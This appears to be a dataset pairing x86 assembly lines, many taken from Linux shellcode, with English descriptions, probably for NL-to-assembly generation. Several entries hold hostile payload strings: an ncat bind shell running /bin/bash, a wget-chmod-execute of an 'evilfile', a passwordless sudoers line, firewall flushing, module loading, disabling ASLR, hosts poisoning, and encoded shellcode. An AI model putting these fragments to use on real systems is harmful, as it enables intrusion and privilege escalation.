cmp ecx, 0h	compare ecx with 0h
cmp ecx, 10	compare if ecx is equal to 10
cmp ecx, 100	compare if ecx is equal to 100
cmp ecx, 100	compare if our counter is equal to 100
cmp ecx, 5	compare ecx with 5
cmp ecx, ebp	compare ecx and ebp
cmp ecx, ebp	compare the contents of the ecx register with the contents of the ebp register
cmp ecx, edx \n ja l1	jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register
cmp ecx, edx \n ja l1	if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else
cmp edi, 0	compare if edi is equal to 0
cmp edx, 0	compare if edx is zero
cmp edx, 0x43 \n ja loop \n push edx	jump to the loop label if the unsigned contents of the edx register is greater than the unsigned value 0x43 else push the contents of the edx register onto the stack
cmp edx, 0x43 \n ja loop \n push edx	if the unsigned contents of the edx register is greater than the unsigned value 0x43 then jump to the loop label else push the contents of the edx register onto the stack
cmp edx, 10	compare whether the edx register has reached 10
cmp edx, 42	compare the contents of edx to 42
cmp edx, 42 \n je short loc_402B13	jump to loc_402B13 if the contents of the edx register is equal to 42
cmp edx, 42 \n je short loc_402B13	if the contents of the edx register is equal to 42 then jump to loc_402B13
cmp edx, ebx	compare the contents of edx and the contents of ebx
cmp edx, ebx \n je 0x8 \n	jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register
cmp edx, ebx \n je 0x8 \n	if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8
cmp edx, ebx \n je 0x8 \n mov ebx, edx	jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register
cmp edx, ebx \n je 0x8 \n mov ebx, edx	if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8 else move the contents of the edx register into the ebx register
cmp esi, 10	compare if esi is equal to 10
cmp esi, edx \n je find_egg	jump to the find_egg label if the contents of the esi register is equal to the contents of the edx register
cmp word [ecx], 0x5951	compare the word at the address ecx and 0x5951
code:	define the code label
connect:	define connect function
cont:	define the cont label
contents db 'hello world!', 0h	define a string db and initialize to 'hello world!'
createfile:	declare the createfile label
createfile:	define createfile function
cycle:	declare the cycle label
cycle:	define cycle label
data:	declare the data label
db ',ajm,pk#########'	define the byte string ',ajm,pk#########'
db '/bin/sh'	define a byte string and initialize it to '/bin/sh'
db '/bin/sh#sh#'	define the byte string '/bin/sh#sh#'
db '/proc/sys/kernel/randomize_va_spacex'	define the byte string '/proc/sys/kernel/randomize_va_spacex'
db '/sbin/insmod#/tmp/o.o'	define the byte string '/sbin/insmod#/tmp/o.o'
db '/sbin/ipchains#-f#'	define the byte string '/sbin/ipchains#-f#'
db '/sbin/iptables#-f#'	define the byte string '/sbin/iptables#-f#'
db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'	define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
db '0',10	define the byte string '0',10
db 'my.txtx'	define the byte string 'my.txtx'
db '/bin/sh'	define the byte string '/bin/sh'
db '/etc/passwd#'	define the byte string '/etc/passwd#'
db 'all all=(all) nopasswd: all', 0xa	define the byte string 'all all=(all) nopasswd: all'
db 'cp /bin/sh /tmp/sh'	define the byte string 'cp /bin/sh /tmp/sh'
db 'egg mark'	define the byte string 'egg mark'
db 'egg mark'	initialize a string to 'egg mark'
db 'rm -f /tmp/f'	define the byte string 'rm -f /tmp/f'
db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b	define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b
db 0x68	declare a byte contining 0x68
db 0x68	declare a byte with no label containing the value 0x68
db 0x80	declare a byte and initialize it to 0x80
db 0x80	declare an unlabeled byte initialized to 0x80
db 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d	define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
db 0xcd	define a byte and initialize it to 0xcd
db 0xcd	define the byte 0xcd
db 10	declare a byte with no label containing the value 10
db 10	declare an unlabeled byte initialized to 10
dd 0xdeadbeef	define a byte and initialize it to 0xdeadbeef
dec byte dl	decrement the byte at the address dl by one
dec byte dl	decrement the byte in dl
dec cl	decrement the cl register by one
dec cl	decrement the contents of cl
dec cl	decrement the contents of the cl register
dec cl \n jns dup2	decrement the contents of the cl register and jump to the dup2 label if the result is not negative
dec cl \n jns loop_dup	decrement the contents of the cl register and jump to the loop_dup label if the result is not negative
dec cl \n jns loopinghere	decrement the contents of the cl register and jump to the loopinghere label if the result is not negative
dec dl	decrement the dl register by one
dec eax	decrement eax
dec eax	decrement the contents of the eax register
dec eax	decrement the eax register by one
dec eax	subtract one from the contents of eax
dec ebp	decrement ebp
dec ebx	decrement ebx
dec ebx	decrement the ebx register by one
dec ebx	subtract one from the contents of ebx
dec ecx	decrement ecx
dec ecx	decrement ecx by 1
dec ecx	decrement the contents of the ecx register
dec ecx	decrement the ecx register by one
dec ecx \n jns _dup2_loop	decrement the contents of the ecx register and jump to the _dup2_loop label if the result is not negative
dec ecx \n jns 2f_loop	decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative
dec ecx \n jns dup2	decrement the contents of the ecx register and jump to the dup2 label if the result is not negative
dec ecx \n jns dup2loop	decrement the contents of the ecx register and jump to the dup2loop label if the result is not negative
dec ecx \n jns dup2loop	decrement ecx by 1 and jump to the dup2loop procedure until ecx equals 0
dec ecx \n jns duploop	decrement the contents of the ecx register and jump to the duploop label if the result is not negative
dec ecx \n jns loop	decrement the contents of the ecx register and jump to the loop label if the result is not negative
dec ecx \n jns loop2	decrement the contents of the ecx register and jump to the loop2 label if the result is not negative
dec ecx \n jz counter_is_now_zero	decrement the contents of the ecx register and jump to the counter_is_now_zero label if the result is zero
dec edx	decrement edx
dec edx	decrement the edx register by one
dec esp	decrement esp
dec esp	decrement the esp register by one
decode_pr:	define decode_pr label
decode:	declare the decode label
decode:	define decode function
decode:	define decode label
decoded_shellcode:	define decoded_shellcode function
decoder:	declare the decoder function
decoder:	declare the decoder label
decoder:	define decoder function
decoder:	define decoder label
decrypt:	declare the decrypt label
dim: equ 25	declare a constant size and set equal to 25
dim: equ 512	define dim to be 512 bytes large
div dword [value]	divide the contents of eax by the word value stored at memory location value
div dword [var]	divide the contents of in eax by by the word value stored at memory location var
div ebx	divide eax by ebx
div ebx	divide the contents of eax by the contents of ebx
div ecx	divide eax by ecx
div ecx	divide eax by ecx the result of the division is stored in eax and the remainder in edx
div edx	divide eax by value in edx
div esi	divide eax by esi
do_dup:	declare the do_dup label
do_dup:	define do_dup label
doit:	declare the doit label
done:	declare the done label
download:	declare the download label
download:	define download function
dup2:	declare the dup2 label
dup2:	define dup2 function
dup2loop:	delcare the dup2loop label
duploop:	declare the duploop label
duploop:	define duploop function
egg equ 'egg '	define egg equal to 'egg '
egg1 equ 'mark'	define egg1 equal to 'mark'
egghunter:	declare the egghunter label
enc:	declare the enc label
encodedshellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce	define the array of bytes encodedshellcode and initialize it to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
encodedshellcode: db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3	define the array of bytes encodedshellcode and initialize it to 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3
encrypt:	declare the encrypt label
end:	declare the end label
entrypoint:	declare the entrypoint label
even_number:	define even_number function
execfile:	declare the execfile label
execfile:	define execfile function
execute:	declare the execute label
exit_call equ 1	define exit_call equal to 1
exit_on_error:	declare the exit_on_error label
exit:	declare the exit label
exit:	define exit function
exit:	define the exit label
file: db '/sbin/iptables#-f'	define file as the byte string '/sbin/iptables#-f'
fileaddress:	declare the fileaddress label
filecontents: resb 128	reserve filecontents variable of 128 bytes
filename: db 'readme.txt', 0h	create a string filename and initialize to 'readme.txt'
filename: resb 255	reserve a variable filename of 255 bytes
fill:	declare the fill label
fill:	define fill label
find_egg:	declare the find_egg label
find_egg:	define find_egg function
format:	declare the format label
format:	define format label
formatting:	declare the formatting label
formatting:	define formatting label
four:	declare the four label
fupdisasm:	define fupdisasm function
fupdisasm:	define fupdisasm label
get:	declare the get label
global _shell	declare _shell as global label
global _star	declare of the global _star
global _start	declare _start as global label
global _start	declare global _start
global _start	global _start
global _start:	declare the global _start label
google db '127.1.1.1 google.com'	define google as the byte string '127.1.1.1 google.com'
google: db '127.1.1.1 google.com'	define the byte string google and initialize it to '127.1.1.1 google.com'
gotocall:	declare the gotocall label
hello: db 'hello world!',10	create a string 'hello world!' plus a linefeed character
hellolen: equ $-hello	define hellolen equal to the length of the hello string
here:	declare the here label
here:	define here label
inc [count]	increment the count variable
inc al	increment the contents of the al register
inc ax	add 1 to ax
inc ax	increment ax
inc ax	increment the contents of the ax register
inc bl	increment the contents of the bl register
inc bx	increment bx
inc bx	increment the contents of the bx register
inc byte [esp+ecx]	increment the byte at the address [esp+ecx] by one
inc cl	increment the contents of the cl register
inc count	increment the memory variable count
inc dl	increment dl
inc dl	increment dl register
inc dl	increment the contents of the dl register
inc dword [tmp]	add one to the doubleword integer stored at memory location tmp
inc dword [value]	add one to the doubleword integer stored at memory location value
inc dword [var]	add one to the doubleword integer stored at location var
inc dx	increment the contents of the dx register
inc eax	increment eax
inc eax	increment the address in eax by one byte
inc eax	increment the contents of the eax register
inc ebx	increment ebx
inc ebx	increment ebx register
inc ebx	increment the contents of the ebx register
inc ecx	increment ecx
inc ecx	increment the contents of the ecx register
inc edi	increment edi
inc edi	increment the contents of the edi register
inc edx	increment edx
inc edx	increment the contents of the edx register
inc esi	increment esi
inc esi	increment the contents of the esi register
inc esp	increment the contents of the esp register
inc_dec:	declare inc_dec function
incaddr:	declare the incaddr label
incpage:	declare incpage function
init:	declare the init label
int 0x80	call kernel
int 0x80	execute execve syscall
int 0x80	execute execve with system call interrupt
int 0x80	execute exit syscall
int 0x80	execute the reboot syscall
int 0x80	make the kernel call
int 0x80	make the system call
int 0x80	make the system call to the kernel
int 0x80	system call interrupt
int 0x80	system call interrupt 0x80
int 80h	call sys_read
int 80h	call sys_read to fill the buffer
int 80h	call sys_write
int 80h	call the kernel
int 80h	make kernel call to display line string
int 80h	make kernel call to exit program
int 80h	make sys_exit kernel call
int 80h	make sys_write kernel call
int 80h	make syscall to output the text to stdout
int 80h	make syscall to terminate the program
int 80h	make the syscall to terminate the program
int 80h	make the system calls to the kernel
ja exi	jump to exi if greater
ja exit	jump to the exit label if the destination operand is greater than the source operand in the above comparison
ja next	jump to next label if the destination is greater than the source in the above comparison
ja write	jump to write if greater
jb 0xf3	perform an unsigned comparison and jump to 0xf3 if lower
jb modtest	jump to label modtest if below
jb next	jump to label next if below
jb write	jump to label write if below
jbe done	jump to label done if below or equal
je all	jump to the all label if the operands of the above comparison are equals
je connec	jump to connect if equal
je connect	jump to the connect label if the operands of the above comparison are equals
je continue	if equal jump to label continue
je continue	jump to label continue if equal
je done	jump to label done if equal
je even_number	jump to even_numer if greater
je exit	jump to label exit if equal to 0
je exit	jump to the exit label if the operands of the above comparison are equals
je l7	if equal then jump to label l7
je short encodedshellcode	jump short to encodedshellcode if equal
je short loc_402b13	jump to loc_402b13 if equal
je stop	jump to label stop if equal
jeq loop	jump to the code location labeled loop if the operands of the previous comparison are equal
jg finished	jump if greater than to label finished
jl _while_loop	jump to the _while_loop if lower
jl _while_loop	jump to the _while_loop label if the destination operand is less than the source operand in the above comparison
jl finished	jump if less than to label finished
jl wrap_around	jump to the wrap_around label if the destination operand is less than the source operand in the above comparison
jle lp1	if it is less than or equal to 10 then jump to lp1
jmp _accept	jump to label _accept
jmp _read	jump to _read
jmp _return	jump to the _return label
jmp _star	jump to _star
jmp _start	jump to the _start label
jmp _while_loop	jump to the _while_loop label
jmp aslr_file	jump to the aslr_file label
jmp begin	jump to the instruction labeled begin
jmp call_egghunter	jump to the call_egghunter label
jmp callpop	jump to callpop
jmp callpop	jump to the callpop label
jmp callz	jump to the callz label
jmp carryon	jump to the carryon label
jmp connec	jump to connec
jmp data	jump to the data label
jmp eax	jump to eax
jmp eax	jump to the value stored in the eax register
jmp ecx	jump to ecx
jmp edi	jump to edi
jmp edi	jump to the edi label
jmp edx	jump to edx
jmp encrypt	jump to the encrypt label
jmp entrypoint	jump to the entrypoint label
jmp esp	jump to the esp label
jmp fupdisasm+1	jump to fupdisasm+1
jmp fupdisasm+1	jump to the address specified by the operation fupdisasm+1
jmp fupdisasm+3	jump to the address specified by the operation fupdisasm+3
jmp jocker	jump to the jocker label
jmp l20	jump to label l20
jmp loop	jump to the label loop
jmp multiplyloop	jump to label multiplyloop
jmp nextarg	jump to nextarg label
jmp nextchar	jump to the point in the code labeled nextchar
jmp one	jump to the one label
jmp read	jump to label read
jmp read	jump to the label read
jmp read	jump to the read label
jmp reading	jump to the reading label
jmp shell	jump to the shell label
jmp shellcode	jump to shellcode
jmp shellcode	jump to the shellcode label
jmp short _cmd	jump short to the _cmd label
jmp short _execline	jump short to the _execline label
jmp short _file	jump short to the _file label
jmp short _load_data	jump short to _load_data label
jmp short _load_data	jump short to the _load_data label
jmp short _star	jump short to _star label
jmp short _start	jump short to the _start label
jmp short .exit	jump short to the .exit label
jmp short 0x11	jump short to 0x11
jmp short 0x2c	jump short to 0x2c
jmp short 0x34	jump short to 0x34
jmp short 0x63	jump short to 0x63
jmp short call_decoder	jump short to call_decoder
jmp short call_decoder	jump short to the call_decoder label
jmp short call_shellcode	jump short to call_shellcode
jmp short call_shellcode	jump short to the call_shellcode label
jmp short call_write	jump short to the call_write label
jmp short callit	jump short to the callit label
jmp short callme	jump short to the callme label
jmp short cmd	jump short to the cmd label
jmp short cycle	jump short to cycle label
jmp short cycle	jump short to the cycle label
jmp short decode	jump short to decode
jmp short decode	jump short to the decode label
jmp short decode_pr	jump short to the decode_pr label
jmp short enc	jump short to the enc label
jmp short end	jump short to the end label
jmp short exi	jump short to exi label
jmp short fileaddress	jump short to the fileaddress label
jmp short formatting	jump short to the formatting label
jmp short four	jump short to the four label
jmp short get	jump short to the get label
jmp short gotocall	jump short to the gotocall label
jmp short here	jump short to the here label
jmp short inc_dec	jump short to inc_dec
jmp short main	jump short to the main label
jmp short output	jump short to the output label
jmp short path	jump short to the path label
jmp short process_shellcode	jump short to the process_shellcode label
jmp short push_cmd	jump short to push_cmd
jmp short push_cmd	jump short to the push_cmd label
jmp short read	jump short to the read label
jmp short rotate	jump short to the rotate label
jmp short search	jump short to the search label
jmp short setup	jump short to the setup label
jmp short shellcode	jump short to shellcode
jmp short shellcode	jump short to the shellcode label
jmp short stage	jump short to stage
jmp short stage	jump short to the stage label
jmp short three	jump short to the three label
jmp short todo	jump short to the todo label
jmp short two	jump short to the two label
jmp two	jump to the two label
jmp two	jump to two
jmp_search:	define the jmp_search label
jnc 0x86	jump to 0x86 if the carry flag is zero
jnc 0xd8	jump to 0xd8 it the carry flag is zero
jne _nex	if not equal jump to the _nex label
jne _next	jump to the _next label if the operands of the above comparison are not equals
jne 804809a	jump to 804809a if not equal
jne 80480aa	jump to 80480aa if not equal
jne checkbuzz	if the remainder is not equal to zero jump to local label checkbuzz
jne checkint	if the remainder is not equal to zero jump to local label checkint
jne loop	jump to the address specified by the label loop if the operands are not equals in the previous comparison
jne next_addr	jump to the next_addr label if the operands of the above comparison are not equals
jne nextnumber	if not equal jump to the label nextnumber
jne no_error	jump to the label no_error if not equal
jne retry	jump to retry if not equal
jne short _while_loop	if not equal jump short to the _while_loop
jne short _while_loop	jump to the _while_loop label if the operands of the above comparison are not equals
jns _dup2_loop	jump to the _dup2_loop label if the previous instruction clears the sign flag
jns 2f	jump to 2f if the sign flag is zero
jns 3f	jump to 3f if the sign flag is zero
jns decode_pr	jump to decode_pr if not signed
jns dup2	jump to dup2 if not negative
jns dup2	jump to the dup2 label if the previous instruction clears the sign flag
jns duploop	jump to duploop if not negative
jns duploop	jump to the duploop label if the previous instruction clears the sign flag
jns loop	jump to the loop label if the previous instruction clears the sign flag
jns loopinghere	jump to the loopinghere label if the previous instruction clears the sign flag
jnz _start	jump to the _start label if the zero flag is cleared
jnz 0x41	jump to 0x41 if not zero
jnz 0x8	jump to 0x8 if not zero
jnz 1	if not zero jump to numeric label 1
jnz 1	jump to the numeric label 1 if the zero flag is cleared
jnz decode	jump to the decode label if the zero flag is cleared
jnz exeunt	jump to exeunt if not zero
jnz exit_on_error	jump to the exit_on_error label if the zero flag is cleared
jnz incaddr	increment address if no match
jnz incaddr	jump to incaddr if no match
jnz l00p	jump to the l00p label if the zero flag is cleared
jnz loop	jump to loop if not equal to zero
jnz loop	jump to the loop label if the zero flag is cleared
jnz next_addr	jump to next_addr if not zero
jnz next_cycle	if not zero jump to the next_cycle label
jnz next_cycle	jump to the next_cycle label if the zero flag is cleared
jnz scan	if not 0 then jump to the scan label
jnz short _paren	if not zero jump short to the _paren label
jnz short _parent	jump short to the _parent label if the zero flag is cleared
jnz short decode	jump short to decode if not zero
jnz short decode	jump short to the decode label if the zero flag is cleared
jnz short loc_4010e5	if not zero jump to loc_4010e5
jnz stage	jump to the stage label if the zero flag is cleared
jnz top	if not 0 then jump to the top label
jocker:	declare the jocker label
js error	jump to error label if sign flag SF is equal to 1
jz _close	jump to the label _close if the zero flag is set
jz _read	jump to the label _read if the zero flag is set
jz _start	jump to the _start label if the zero flag is set
jz 0x8	jump to 0x8 if zero
jz call_decoded	jump to the call_decoded label if the zero flag is set
jz child	if zero jump to the child label
jz child	jump to child if zero
jz child	jump to label child if the zero flag is set
jz child	jump to the child label if the zero flag is set
jz decoded_shellcode	jump to decoded if zero
jz download	jump to download if zero
jz download	jump to the download label if the zero flag is set
jz encoded	if zero jump to the encoded label
jz encoded	jump to the encoded label if the zero flag is set
jz exit	jump to the exit label if the zero flag is set
jz find_egg	jump to find_egg if zero
jz find_egg	jump to the find_egg label if the zero flag is set
jz finished	jump to the point in the code labeled finished if zero
jz formatting	if zero jump to the formatting label
jz formatting	jump to the formatting label if the zero flag is set
jz incpage	jump to incpage if equal
jz next_cycle	if zero jump to the next_cycle label
jz next_cycle	jump to the next_cycle label if the zero flag is set
jz next_page	jump to next_page if zero
jz nomoreargs	if zero flag is set jump to nomoreargs label
jz shift_decode	if zero jump to the shift_decode label
jz shift_decode	jump to the shift_decode label if the zero flag is set
jz short loc_402b13	if 0 then jump to loc_402b13
key equ 0xdeadbeef	define key constant equal to 0xdeadbeef
l00p:	declare the l00p label
lea bx, [bp+0x08]	load the effective address of the operation [bp+0x08] into the bx register
lea bx, [bp+0x0b]	load the effective address of the operation bp+0x0b] into the bx register
lea cx, [bp+di+0x32]	load the effective address of the operation [bp+di+0x32] into the cx register
lea dx, [bp+di+0x3e]	load the effective address of the operation [bp+di+0x3e] into the dx register
lea eax, [ebx+0xf]	load the effective address of the result of the operation [ebx+0xf] into the eax register
lea eax, [ebx+17h]	load the effective address of the result of the operation [ebx+17h] into the eax register
lea eax, [ebx+8]	put the address of ebx+8 into eax
lea eax, [ecx+0bh]	load the effective address of the result of the operation [ecx+0bh] into the eax register
lea eax, [ecx+4]	load the effective address of the result of the operation [ecx+4] into the eax register
lea eax, [val]	place the value val in eax
lea eax, [var]	place the address of var in eax
lea eax, [var]	place the value in var in eax
lea eax, [zero_reg+3]	load the effective address [zero_reg+3] into eax
lea eax, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the eax register
lea eax, [zero_reg+6]	load the effective address [zero_reg+6] into eax
lea eax, [zero_reg+6]	load the effective address of the result of the operation [zero_reg+6] into the eax register
lea eax, [zero_reg+66h]	load the effective address [zero_reg+66h] into eax
lea eax, [zero_reg+66h]	load the effective address of the result of the operation [zero_reg+66h] into the eax register
lea eax,[ebx+0xb]	load the effective address of the operation [ebx+0xb] into the eax register
lea ebp,[ebp+0x59]	load the effective address of the operation [ebp+0x59] into the ebp register
lea ebx, [ebp-8]	load the effective address [ebp-8] into ebx
lea ebx, [ebp-8]	load the effective address of ebp-8 into the ebx register
lea ebx, [ebp+24]	load the effective address [ebp+24] into ebx
lea ebx, [ebp+24]	load the effective address of the result of the operation [ebp+24] into the ebx register
lea ebx, [ebp+39]	load the effective address [ebp+39] into ebx
lea ebx, [ebp+39]	load the effective address of the result of the operation [ebp+39] into the ebx register
lea ebx, [edx+0x4]	load the effective address of edx+0x4 into ebx
lea ebx, [esi]	load the effective address of esi into the ebx register
lea ebx, [esi+13]	load the effective address of the result of the operation [esi+13] into the ebx register
lea ebx, [esi+14]	load the effective address of the result of the operation [esi+14] into the ebx register
lea ebx, [esi+15]	load the effective address [esi+15] into ebx
lea ebx, [esi+15]	load the effective address of the result of the operation [esi+15] into the ebx register
lea ebx, [esi+23]	load the effective address of the result of the operation [esi+23] into the ebx register
lea ebx, [esp +1]	load the effective address [esp+1] into ebx
lea ebx, [esp +1]	load the effective address of the result of the operation [esp +1] into the ebx register
lea ebx, [esp]	load the effective address of esp into ebx
lea ebx, [esp]	load the effective address of esp into the ebx register
lea ebx, [zero_reg+3]	load the effective address [zero_reg+3] into ebx
lea ebx, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the ebx register
lea ecx, [eax]	load the effective address of the result of the operation [eax] into the ecx register
lea ecx, [ebp+28]	load the effective address [ebp+28] into ecx
lea ecx, [ebp+28]	load the effective address of the result of the operation [ebp+28] into the ecx register
lea ecx, [ebx+0xff]	load the value of ebx+0xff into register ecx
lea ecx, [ebx+8]	load the effective address of ebx+8 into ecx
lea ecx, [esi + 8]	load the effective address of the result of the operation [esi + 8] into the ecx register
lea ecx, [esi+18]	load the effective address [esi+18] into ecx
lea ecx, [esi+18]	load the effective address of the result of the operation [esi+18] into the ecx register
lea ecx, [esi+22]	load the effective address of the result of the operation [esi+22] into the ecx register
lea ecx, [esi+35]	load the effective address of the result of the operation [esi+35] into the ecx register
lea ecx, [esi+8]	load the effective address of the result of the operation [esi+8] into the ecx register
lea ecx, [esp]	load the effective address of esp into the ecx register
lea ecx, [zero_reg+117]	load the effective address [zero_reg+117] into ecx
lea ecx, [zero_reg+117]	load the effective address of the result of the operation [zero_reg+117] into the ecx register
lea ecx, [zero_reg+3]	load the effective address [zero_reg+3] into ecx
lea ecx, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the ecx register
lea edi, [ebx]	load the effective address [ebx] into edi
lea edi, [ebx]	load the effective address of ebx into the edi register
lea edi, [ebx+4*esi]	place the quantity ebx+4*esi in edi
lea edi, [ebx+4*esi]	place the value ebx+4*esi in edi
lea edi, [esi + 13]	load the effective address of the result of the operation [esi + 13] into the edi register
lea edi, [esi +1]	load the effective address of [esi + 1] into the edi register
lea edi, [esi]	load the effective address [esi] into edi
lea edi, [esi+13]	load the effective address of esi+13 into esi+13
lea edx, [ebx+12]	load the effective address of ebx+12 into edx
lea edx, [esi + 12]	load the effective address of the result of the operation [esi + 12] into the edx register
lea edx, [esi+26]	load the effective address [esi+26] into edx
lea edx, [esi+26]	load the effective address of the result of the operation [esi+26] into the edx register
lea edx, [esi+30]	load the effective address of the result of the operation [esi+30] into the edx register
lea edx, [esi+47]	load the effective address of the result of the operation [esi+47] into the edx register
lea esi, [ebp+20]	load the effective address [ebp+20] into esi
lea esi, [ebp+20]	load the effective address of the result of the operation [ebp+20] into the esi register
lea esi, [esi +4]	load the effective address of the result of the operation [esi +4] into the esi register
lea esi, [esi+4]	load the effective address [esi+4] into esi
lea esp, [ebx]	load the value of register ebx into register esp
len equ $ - msg	define len equal to the length of msg
len equ $-encodedshellcode	define len equal to the lenght of the encodedshellcode array
len: equ $-google	declare the len label equal to the size of the google variable
len: equ $-shellcode	declare the len label equal to the length of shellcode
letter_c db 'c'	allocate a single byte of memory and initialize it to the letter 'c'
line db '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a	define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a
loader:	declare the loader label
loop .3	decrement the counter and jump to .3 label if the count is not zero
loop 3	decrement ecx and jumps to the 3 label unless decrementing ecx caused its value to become zero
loop bucle	decrement the ecx register and jump to the bucle label if the counter is not zero
loop check_even_odd	decrement the count register and jump to check_even_odd if the count is not equal to zero
loop check_even_odd \n jmp short shellcode	decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label
loop decode	decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero
loop decode	decrement the count register and jump to decode if not equal zero
loop decode \n jmp edx	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register
loop decode \n jmp EncodedShellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the EncodedShellcode label
loop decode \n jmp Shellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label
loop decode \n jmp short shellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label
loop decrypt	decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero
loop decrypt \n jmp encrypt	decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label
loop do_dup	decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero
loop do_dup	decrement the counter and jump to the do_dup label if the count is not zero
loop do_dup \n push byte 0x3f	decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack
loop eggLoop \n jmp edi	decrement the ecx register and jump to the eggLoop label if the contents of the ecx register is not zero else jump to the edi register
loop fill	decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero
loop fill	decrement the counter and jump to the fill label if the count is not zero
loop fill \n mov ecx, esp	decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
loop l1 \n mov eax, esp	decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register
loop l1 \n mov eax, esp	decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register
loop l2 \n jmp edi	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else jump to the edi register
loop l2 \n mov ebx, esp	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
loop l2 \n mov ebx, esp	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else point the ebx register to the stack register
loop l3 \n mov ecx, esp	decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
loop l3 \n mov ecx, esp	decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register
loop l4 \n mov edx, esp	decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else move the contents of the esp register into the edx register
loop l4 \n mov edx, esp	decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register
loop main_inc	decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero
loop main_inc \n mov ebx, esp	decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
loop main_inc \n mov ebx, esp	decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register
loop main_loop	decrement the counter and jump to the main_loop label if the count is not zero
loop main_push	decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero
loop main_push \n mov cl, 30	decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register
loop ROT_decode \n jmp short Shellcode	decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label
loop up	decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero
loop:	declare the loop label
loop:	define the loop label
loopinghere:	declare the loopinghere label
loopnz decode	decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero
loopnz L1	decrement the counter and jump to the L1 label if the count is not zero and the zero flag is equal to zero
loopnz L1 \n jmp shellcode	decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label
loopnz L2	decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero
loopnz L2 \n push eax	decrement the ecx register and jump to the L2 label if the contents of the ecx register is not zero and the zero flag is zero else push the contents of the eax register onto the stack
loopnz L3 \n mov edx, 7	decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register
